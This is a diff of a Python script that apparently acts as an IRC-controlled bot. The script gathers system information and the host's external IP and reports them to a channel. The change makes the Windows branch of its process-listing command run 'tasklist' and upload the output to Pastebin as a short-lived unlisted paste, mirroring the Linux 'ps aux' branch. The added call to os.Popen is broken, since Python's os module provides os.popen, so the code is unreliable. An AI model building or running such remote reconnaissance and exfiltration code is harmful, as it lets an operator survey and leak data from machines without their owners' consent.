@@ -13,10 +13,9 @@ import os # System calls
 import platform # System info gathering
 import locale # System language
 import urllib2 # Used to get external ip address
-import psutil # List processes
 import argparse # CLI arg parsing
 import time # For sleep()
-import subprocess
+import subprocess # Spawn subprocesses
 from pastebin import PastebinAPI
 
 # CLI options
@@ -78,16 +77,20 @@ def get_external_ip(): # Function to get external ip address
     sendmsg(channel, 'There was a problem with the URL: ' + e)
 
 def pslist(): # Function to list process names and pids
+  x = PastebinAPI()
   if (str(platform.platform()))[0:3]=="Win":
-    for proc in psutil.process_iter():
-      time.sleep(2)
-      sendmsg(channel, 'PID: ' + str(proc.pid) + ' | NAME: ' + proc.name)
+    # TODO: Make this pretty
+    paste_code = os.Popen('tasklist').read()
+    url = x.paste(pastebin_api_key,
+                  paste_code,
+                  paste_name = 'tasklist', 
+                  paste_private = 'unlisted',
+                  paste_expire_date = '10M')
   else:
     p = subprocess.Popen(['ps', 'aux'], shell=False, stdout=subprocess.PIPE)
     p.wait()
-    paste_code = p.stdout.read()
     # TODO: Make this pretty
-    x = PastebinAPI()
+    paste_code = p.stdout.read()
     url = x.paste(pastebin_api_key,
                   paste_code,
                   paste_name = 'ps aux', 
